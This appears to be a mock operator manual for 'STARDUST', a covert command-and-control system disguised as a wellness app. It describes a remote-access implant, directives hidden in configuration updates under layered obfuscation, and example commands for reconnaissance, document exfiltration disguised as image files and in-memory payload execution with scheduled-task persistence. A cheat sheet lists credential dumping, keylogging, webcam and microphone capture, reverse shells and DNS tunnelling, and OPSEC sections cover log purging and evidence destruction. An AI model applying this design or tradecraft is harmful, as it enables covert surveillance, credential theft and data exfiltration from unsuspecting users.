Stardust Remote Management System
Operator Guidebook v1.0
Document Classification: TOP SECRET // NOFORN // ORCON
System Codename: STARDUST
Cover Designation: HarmonyFlow Wellness SyncBridge
Authorized Personnel: CONTROL and designated FIELD OPERATORS only.
Burn Notice: Destroy by incineration or degaussing if compromised.

1.0 SYSTEM OVERVIEW & ARCHITECTURE
STARDUST is a next-generation, stealth command-and-control (C2) framework masquerading as a legitimate wellness application ("HarmonyFlow"). The system consists of three layers:

COVER INFRASTRUCTURE (OVERT): Public-facing web services (Session State, Content Delivery, etc.) hosted on standard cloud providers. Handles all legitimate app traffic.
CONTROL LAYER (COVERT): Hidden administrative interfaces and databases embedded within the cover infrastructure. This is where operators issue directives.
IMPLANT (PAYLOAD): The "HarmonyFlow" client application installed on Target Assets. Contains a fully functional, modular RAT payload that executes directives received from the Control Layer.
Key Principle: All communication is one-way pull. The Implant never initiates contact. It periodically checks for updates (configuration, rulesets, content indices) from the public Overt servers. Hidden within these legitimate updates are Directives.

2.0 OPERATOR ACCESS & THE CONTROL PANEL
2.1 Accessing the True Interface

The public admin.harmonyflow.com dashboard is a facade with limited, legitimate functions.
The True Control Panel is accessed via a specific URL path and a dual-factor authentication cookie that is only set after a successful login with an account possessing the ORCHESTRATOR system role.
True Control Panel URL: https://admin.harmonyflow.com/console/v1/core (bookmark this; it is not linked anywhere).
Authentication: Log in via standard SSO, then append ?mode=controller&authkey=[SESSION_UUID] where [SESSION_UUID] is obtained by making a GET request to /api/internal/auth/genkey while authenticated (this endpoint only responds to ORCHESTRATOR roles).
2.2 Control Panel Layout
Once authenticated, you will see the STARDUST Operator Console with the following modules:

ASSET MANAGEMENT: View online/offline implants, their metadata (OS, user, location), and health status.
DIRECTIVE QUEUE: Compose, schedule, and send commands to individual assets or cohorts.
PARSER CONFIG: Manage the obfuscation schemas and data encoding for directives.
EXFILTRATION HUB: Review and download data exfiltrated from assets.
LOGS & AUDIT: System event logs and operator action audit trail.
3.0 ASSET MANAGEMENT
3.1 Viewing Assets
The Asset Management dashboard lists every unique Implant that has phoned home in the last 90 days.

Columns include:

Asset ID (AID): Unique identifier derived from hardware fingerprints.
Status: ONLINE (checked in within last heartbeat interval), OFFLINE, DEGRADED (errors reported).
Metadata: OS version, username, device name, public IP (geolocated), install date.
Last Directive: The last command executed and its result.
Tags: Operator-assignable labels (e.g., high-value, unstable, priority-target).
3.2 Filtering & Searching

Use the query bar to filter by any metadata field: os:"Windows 11", user:contains("admin"), ip_country:"DE".
Create and save Asset Groups for quick targeting (e.g., Group: "All-EU-Servers").
3.3 Asset Detail View
Click any Asset ID to see its detail panel:

Timeline: Chronological log of all directives sent to and results received from this asset.
Live System Snapshot: On-demand button to trigger the asset to collect and report a fresh system snapshot (running processes, network connections, installed software).
Direct Access: Buttons to initiate a direct shell session (via hidden WebSocket tunnel) or file browser.
4.0 DIRECTIVE ISSUANCE: THE CORE TASK
A Directive is an instruction packaged within a legitimate-looking configuration update. The Implant extracts and executes it.

4.1 Directive Composition
Navigate to Directive Queue > Compose New.

Fields:

Target: Select individual Asset IDs, a saved Asset Group, or a Cohort (a dynamic group based on metadata, e.g., all assets with os:Windows).
Delivery Channel: Choose how the directive is hidden.
Channel A (Ruleset): Embeds directive in a "collaboration ruleset" JSON object. Use for small commands (< 2KB).
Channel B (UI Config): Embeds directive in an A/B test "metadata" field. Use for modular payload delivery.
Channel C (Content Chunk): Splits large directives across multiple fake media files. Use for binary drops (> 100KB).
Directive Payload: The actual command, script, or binary to execute. Enter in plaintext or upload a file.
Obfuscation Level:
Level 1 (Minimal): Simple base64 encoding. Fastest.
Level 2 (Standard): Base64 + XOR with a rotating per-asset key.
Level 3 (High): AES-256 encryption + steganographic distribution across multiple configuration fields.
Execution Trigger:
Immediate: Execute as soon as the directive is fetched.
Scheduled: Execute at a specific UTC time.
Conditional: Execute when a condition is met on the asset (cpu_idle > 80%, user_active == false).
Persistence: Yes/No. If Yes, the directive is saved to the asset's persistent store and will re-execute on every implant restart until revoked.
Cleanup: Automatic/Manual. Automatic tells the implant to delete any dropped files and scrub logs after execution.
4.2 Directive Examples

Example 1: Reconnaissance (cmd.exe command)

Target: Asset Group Initial_Footprint.
Channel: A (Ruleset).
Payload: whoami && systeminfo && ipconfig /all && netstat -ano
Obfuscation: Level 1.
Trigger: Immediate.
Result: The output will be captured, compressed, encrypted, and exfiltrated via the next scheduled content index check-in. You will find it in the Exfiltration Hub under the Asset ID.
Example 2: File Exfiltration

Target: Single high-value asset.
Channel: C (Content Chunk). The system will split the directive.
Payload: COLLECT: ["%USERPROFILE%\\Documents\\*.pdf", "%APPDATA%\\*.config"]; TARGET_ZIP: "C:\\Windows\\Temp\\stage1.zip"; EXFIL_PATH: "/cdn/chunks/weather-report.png"
Obfuscation: Level 3.
Trigger: Conditional (time between 02:00-04:00 local).
Result: The implant will collect matching files, zip and encrypt them, then upload the zip to the overt CDN disguised as a PNG chunk. You download it from the Exfiltration Hub, which will automatically reassemble and decrypt it.
Example 3: Binary Execution & Persistence

Target: Cohort os:Windows 10+.
Channel: B (UI Config) for loader, C for binary.
Payload:
Stage 1 (Loader via UI Config): FETCH_BINARY from /cdn/chunks/meditation_track_45.mp3; EXECUTE_MEMORY; PERSIST_VIA_SCHEDTASK "HarmonyFlowUpdater"
Stage 2 (Binary via Content Chunk): [Upload your payload.exe file].
Obfuscation: Level 2 for loader, Level 3 for binary.
Trigger: Immediate for loader (which then fetches and executes the binary).
Result: The binary (payload.exe) is downloaded, injected into a running harmonyflow.exe process, and a scheduled task is created for persistence.
4.3 Sending the Directive
After composition, click "Queue Directive." It enters the Pending Queue.

Validate: The system will simulate the obfuscation and embedding process to ensure it produces a valid cover-configuration.
Approve: An operator with APPROVER role must review and click "Release."
Delivery: The system updates the relevant cover service (Ruleset Configuration, Personalization, Content Index) with the hidden directive. Implants will receive it on their next poll (within 5 minutes to 2 hours, depending on client state).
5.0 EXFILTRATION HUB
All data stolen from assets arrives here.

5.1 Structure

Incoming Queue: Raw, encrypted blobs as they arrive.
Processing Pipeline: Automatically decrypts, decompresses, and categorizes data based on MIME type and origin asset.
Repository: Organized by Asset ID and date. Supports preview (text, images) and download.
5.2 Data Types & Handling

Text/Logs: Viewable in-browser. Can be bulk exported as .txt or .csv.
Documents (PDF, DOCX): Preview first page. Download original.
Credentials: Extracted credentials (browsers, system) are automatically parsed and added to the Credential Vault (a separate, air-gapped database not covered here).
Binary Dumps: Memory dumps, disk images. Download only.
5.3 Search
Full-text search across all exfiltrated content. Example: search: "confidential" AND asset_group:"Finance-Department".

6.0 OPERATIONAL SECURITY (OPSEC) PROTOCOLS
6.1 Directive OPSEC

Never send the same directive to all assets simultaneously. Spread over hours/days.
Use Conditional Triggers to execute during local idle times.
Set Cleanup to Automatic unless you explicitly need to retain tools on disk for later use.
Rotate Obfuscation Keys weekly via the Parser Config module.
6.2 Cover Traffic Maintenance

Blend In: Ensure the overt HarmonyFlow app continues to function normally. Periodically publish legitimate configuration updates and A/B tests to maintain the cover's authenticity.
Load Simulation: Use the Control Panel's Traffic Simulator to generate fake user activity (session heartbeats, content downloads) that matches the geographic and temporal patterns of your real implants.
6.3 Operator OPSEC

Access the Control Panel only from a dedicated, isolated operator VM (e.g., Tails, Qubes).
Use the provided internal VPN (separate from the cover infrastructure) to connect to the operator endpoints.
All actions are logged, but logs are automatically purged after 30 days. For ultra-sensitive operations, use the "Ephemeral Directive" flag, which prevents any logging of the specific directive composition and delivery.
6.4 Compromise Response

Indicator:
An asset disappears (goes offline and does not return).
Unusual error rates in the cover service logs.
Public exposure of the HarmonyFlow app as malware.
Immediate Actions:
Go Dark: Navigate to System > Emergency Protocol > Scorched Earth.
This will:
Send a self-destruct directive to all online implants (wipes persistent storage, uninstalls).
Shut down the Control Layer and wipe its databases.
Initiate a pre-scripted takedown of the Overt cover infrastructure (simulating a "service outage").
Follow your agency's standard burn and evacuation procedures.
7.0 APPENDIX: DIRECTIVE REFERENCE (CHEAT SHEET)
Basic Recon

GET_SYSTEM_INFO -> Returns detailed OS, hardware, user data.
GET_NETWORK_INFO -> Returns IP, routes, ARP table, netstat.
GET_RUNNING_PROCESSES -> List of PIDs, names, memory usage.
File System Operations

LIST_DIR [path] -> List directory contents.
DOWNLOAD_FILE [remote_path] -> Exfiltrate specific file.
SEARCH_FILES [pattern] [start_path] -> Find files matching pattern.
MONITOR_DIR [path] [interval_s] -> Continuously exfiltrate new/modified files.
Execution & Persistence

EXECUTE_CMD [command] -> Run command via shell.
EXECUTE_POWERSHELL [script] -> Run PowerShell script.
EXECUTE_BINARY [base64_binary] [args] -> Drop and execute a binary.
INSTALL_PERSISTENCE [method] -> Install via scheduled task, service, registry run key, etc.
SHELL_OPEN -> Establish an interactive reverse shell (use with extreme OPSEC caution).
Credential Harvesting

DUMP_LSA -> Extract Windows credentials from memory.
DUMP_BROWSERS -> Extract saved passwords/cookies from Chrome, Firefox, Edge.
DUMP_SSH_KEYS -> Find and exfiltrate SSH private keys.
Network Operations

PORT_SCAN [target] [ports] -> Scan from the asset's perspective.
SOCKS_PROXY [local_port] -> Establish a SOCKS5 proxy through the asset.
DNS_TUNNEL_START -> Establish covert channel via DNS queries.
Advanced

KEYLOGGER_START [duration] -> Start keystroke logging.
WEBCAM_CAPTURE [duration_s] -> Capture webcam footage.
MIC_RECORD [duration_s] -> Record microphone.
MEMORY_DUMP [pid] -> Dump process memory.
Maintenance

SELF_DESTRUCT -> Uninstall implant, wipe traces.
UPDATE_IMPLANT [new_implant_binary] -> Replace running implant with new version.
GO_IDLE [days] - Stop all polling; await wake-up via special network packet.
END OF GUIDEBOOK

Remember: The strength of STARDUST is its perfect mimicry of legitimate traffic. Operate with patience. Let the cover work for you. The slow, silent asset that checks in every 2 hours for "meditation tip updates" is infinitely more valuable than the one that screams its presence with rapid, anomalous requests.

We are the dust in the light beam. Unseen until we choose to coalesce.
